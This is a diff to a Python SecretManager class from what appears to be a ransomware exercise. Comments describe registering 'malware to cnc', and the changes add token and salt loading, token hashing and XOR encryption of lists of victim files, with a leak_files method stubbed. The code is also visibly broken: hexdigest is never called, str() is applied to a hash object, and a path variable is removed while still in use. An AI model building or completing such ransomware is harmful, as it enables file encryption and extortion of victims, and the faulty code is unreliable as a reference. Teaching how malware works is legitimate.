@@ -65,25 +65,20 @@ class SecretManager:
 
     def setup(self)->None:
         # main function to create crypto data and register malware to cnc
-        self._path = "/root/CNC"
-        
-        file = open(self._path + "salt.bin", "rb")
-        self._salt = file.read()
-        file.close()
 
         # on vérifie si le fichier est présent dans le répertoire
-        if os.path.isfile(os.path.join(self._path, "token.bin")):
-            file = open(self._path + "token.bin", "rb")
+        if os.path.isfile(os.path.join(self._path + "/token", "token.bin")):
+            file = open(self._path + "/token/token.bin", "rb")
             self._token = file.read()
             file.close()
         else:
             with open("token.bin", "w") as file:
-                file.write("")
-            
+                file.write(self._token)
 
-
-
-
+        file = open(self._path + "salt.bin", "rb")
+        self._salt = file.read()
+        file.close()
+    
 
     def load(self)->None:
         # function to load crypto data
@@ -102,12 +97,17 @@ class SecretManager:
 
     def get_hex_token(self)->str:
         # Should return a string composed of hex symbole, regarding the token
-        raise NotImplemented()
+        
+        hashed_token = sha256()
+        hashed_token.update(self._token)
+        hashed_token.hexdigest
+
+        return str(hashed_token, "utf8")
 
 
     def xorfiles(self, files:List[str])->None:
         # xor a list for file
-        raise NotImplemented()
+        xorfile(files, self._key)
 
 
     def leak_files(self, files:List[str])->None:
